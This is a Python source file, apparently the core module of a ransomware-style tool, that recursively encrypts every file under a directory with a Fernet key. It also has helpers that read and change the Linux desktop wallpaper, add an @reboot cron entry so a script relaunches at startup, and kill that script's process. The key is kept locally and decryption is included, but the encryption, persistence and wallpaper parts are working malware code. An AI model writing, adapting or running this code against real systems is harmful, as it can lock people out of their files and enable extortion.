from cryptography.fernet import Fernet
from typing import Dict
import sys
import os
from signal import SIGKILL
import json
from subprocess import call, run


class CryptoApp:
    def __init__(self, startPath=None):

        # Init the starting path, and change the current directory to it
        startPath = startPath or os.getcwd()
        os.chdir(startPath)

        KEY_PATH = '.key'

        # If the key exists, that means the files have been already encrypted
        if os.path.isfile(KEY_PATH):
            self.isEncrypted = True

            # Read the current fernet key
            with open(KEY_PATH, 'rb') as file:
                self.key = file.read()
                
        # If the files were not encrypted
        else:
            self.isEncrypted = False
            self.key = Fernet.generate_key()

            # Write the fernet key to a file
            self.writeFile(KEY_PATH, self.key)
            

        # Initialize main variables
        self.omittedFiles = ['.key', 'CryptoApp.py', 'index.py', '.cron_copy']
        self.extensionsToModify = []
        self.KEY_PATH = os.path.abspath(KEY_PATH)
        self.startingPath = startPath
        self.countFiles = 0
        self.countDirs = 0

        try:
            self.fernet = Fernet(self.key)
        except ValueError:

            # If the key is incorrect, delete it, and exit the program
            print('[ERROR] Incorrect key! You can forget about decryption')
            print('[INFO] Removing key...')
            os.remove(self.KEY_PATH)

            exit(1)



    # Run a shell script with an output
    def __getsh(self, command) -> any:
        try:
            result = run(command, capture_output=True, shell=True).stdout.decode('utf-8')
            return result

        except: return None



    # Handle the encrypt/decrypt actions
    def __actionHandler(self) -> None:

        # Get the current directory files and filter ones that shouldn't be modified
        files = list( filter(lambda x: x not in self.omittedFiles, os.listdir()) ) 

        # Filter the file extensions
        if len(self.extensionsToModify):
            files = list( filter(lambda x: x.endswith(tuple(self.extensionsToModify)) or os.path.isdir(x), files) )


        # Loop through each file
        for path in files:
            try:
                isDir = os.path.isdir(path)

                # If the "path" is directory, change the working directory
                # Handle the files recursively, and finally return to the original directory
                if isDir:
                    # Save the current path, and increment the dir count
                    currentDir = os.getcwd()
                    self.countDirs += 1

                    os.chdir(path)
                    self.__actionHandler()   
                    os.chdir(currentDir)

                    continue             


                # Read the file contents
                old_text = self.readFile(path)
                if not old_text: continue


                # Encrypt or decrypt the file
                if self.isEncrypted:
                    new_text = self.fernet.decrypt(old_text)
                else:
                    new_text = self.fernet.encrypt(old_text)


                # Finally, write to the file its new content
                self.writeFile(path, new_text)
                print(f'[MOD] {path} - modified')

                # Increment the modified files count
                self.countFiles += 1


            except PermissionError:
                # Skip if there is a permission error
                print(f'[WARN] Not permitted to operate on: {path}')

            except:
                # Skip if something went wrong
                print(f'[ERROR] Could not modify file: {path}')



    # Choose which files will be skipped during encryption
    def setFilesToSkip(self, files) -> None:
        self.omittedFiles.extend(files)



    # Choose which file extensions will be encrypted (default any, which may cause very serious damage)
    def setExtensionsToModify(self, extensions) -> None:
        self.extensionsToModify.extend(extensions)



    # Helper function for encrypting/decrypting
    def enc_dec_helper(self, type) -> None:
        if type == 'enc': prints = ['Encrypting...', 'Encrypted']
        elif type == 'dec': prints = ['Decrypting...', 'Decrypted']
        else: prints = ['', '']

        print(f'[START] {prints[0]}\n')
        self.__actionHandler()
        print(f'\n[FINISH] {prints[1]} {self.countFiles} files')



    # Encrypt the files
    def encrypt(self) -> None:
        self.enc_dec_helper('enc')



    # Decrypt the files
    def decrypt(self) -> None:
        self.enc_dec_helper('dec')

        os.remove(self.KEY_PATH)



    # Determine the OS, and DE, if on Linux
    # Returns a dictionary with a "os" and "de" fields
    def determineOS(self) -> Dict[str, str]:
        os_info = { "os": "", "de": "" }

        # Get the OS
        if sys.platform in ['linux2', 'linux']:
            os_info["os"] = 'linux'
        elif sys.platform == 'darwin':
            os_info["os"] = 'mac'
        elif sys.platform in ['win32', 'cygwin']:
            os_info["os"] = 'windows'


        # Get the DE
        if os_info["os"] == 'linux':
            de = None

            match os.environ.get("DESKTOP_SESSION"):
                case 'ubuntu': de = 'gnome'
                case 'kubuntu': de = 'kde'
                case 'xfce': de = 'xfce4'
                case _: de = os.environ.get("DESKTOP_SESSION")


            os_info["de"] = de


        return os_info            



    # Set the wallpaper image
    def setDesktopBG(self, target_os, target_de, file) -> None:
        # Return if a file is not truthy
        if not file: return
            
        # Get the absolute path of a file
        abs_path = os.path.abspath(file)

        try:
            if target_os == 'linux':
                # Xfce4 Desktop. Tested with Virtual and monitor0. Not sure about the others
                if target_de == 'xfce4':
                    for monitor in ['Virtual1', '0']:
                        call(f'xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor{monitor}/workspace0/last-image -s {abs_path} 2>/dev/null', shell=True)

                # GNOME
                if target_de == 'gnome':
                    for style in ['picture-uri', 'picture-uri-dark']:
                        call(f'gsettings set org.gnome.desktop.background {style} file://{file}', shell=True)

        except:
            print('[ERROR] Could not change a wallpaper')



    # Get the current wallpaper image
    def getDesktopBG(self, target_os, target_de) -> str | None:
        output = None

        try:
            if target_os == 'linux':
                # Xfce4 Desktop. Tested with Virtual and monitor0. Not sure about the others
                if target_de == 'xfce4':
                    for x in ['Virtual1', '0']:
                        result = self.__getsh(f'xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor{x}/workspace0/last-image')

                        # Remove the line break
                        out = result.rstrip()
                        if out: return out

                # GNOME. Get the dark theme
                elif target_de == 'gnome':
                    result = self.__getsh('gsettings get org.gnome.desktop.background picture-uri-dark')
                    
                    # Remove the "file://" and '' to get a clear url
                    output = result.rstrip().replace('file://', '').replace("'", '')

            return output

        except:
            print('[ERROR] Could not get a wallpaper')
            return None    



    # Launch a specified script on startup using cron
    def cronAction(self, target_os, type, scriptToStart):
        # Check the OS
        if target_os not in ['linux', 'mac']:
            print(f'[ERROR] Running cron on {target_os}')
            return

        # Check if cron is installed
        doesExist = self.__getsh('which crontab')
        if not doesExist or 'not found' in doesExist:
            print('[ERROR] cron is not installed on the system')
            return


        # File to save the original cron settings to
        CRON_ORIGINAL = '.cron_copy'

        if type == 'start':
            CRON_ARG = 'crontab_arg'

            # Check if a script exists
            if not os.path.isfile(scriptToStart):
                print(f'[ERROR]: Script {scriptToStart} not found')
                return


            # Get and save the current cron settings
            current = self.__getsh('crontab -l')
            self.writeFile(CRON_ORIGINAL, current)

            # Add a new entry
            current += f'\n@reboot python3 {scriptToStart}\n'
            self.writeFile(CRON_ARG, current)
            
            # Save the new cron settings and run the script
            call(f'crontab {CRON_ARG}', shell=True)
            call(f'python3 {scriptToStart} &', shell=True)
            os.remove(CRON_ARG)

            print('[INFO] script launched')


        elif type == 'stop' and os.path.isfile(CRON_ORIGINAL):
            # Revert to the original cron settings
            call(f'crontab {CRON_ORIGINAL}', shell=True)
            os.remove(CRON_ORIGINAL)

            try:
                # Get the PID of the process
                pid = self.__getsh(f"ps -aux | grep {scriptToStart} | awk '{{print $2}}'").split('\n')[0]

                # And terminate that process
                if pid and pid.isnumeric():
                    os.kill(int(pid), SIGKILL)
                    print('[INFO] script has been stopped')

            except: return



    # Write to the file
    def writeFile(self, path, val) -> None:
        mode = 'wb' if isinstance(val, bytes) else 'w'

        with open(path, mode) as file:
            file.write(val)



    # Read the file contents
    def readFile(self, path) -> str | None:
        if not os.path.isfile(path):
            print(f'[ERROR] File: {path} does not exist')
            return None

        with open(path, 'rb') as file:
            return file.read()



    # Returns True, if the files were already encrypted (if the key.txt is present)    
    def isAlreadyEncrypted(self) -> bool:
        return self.isEncrypted

    

    # Get the total affected files and directories
    def getCount(self) -> Dict[str, int]:
        return { "dirs": self.countDirs, "files": self.countFiles }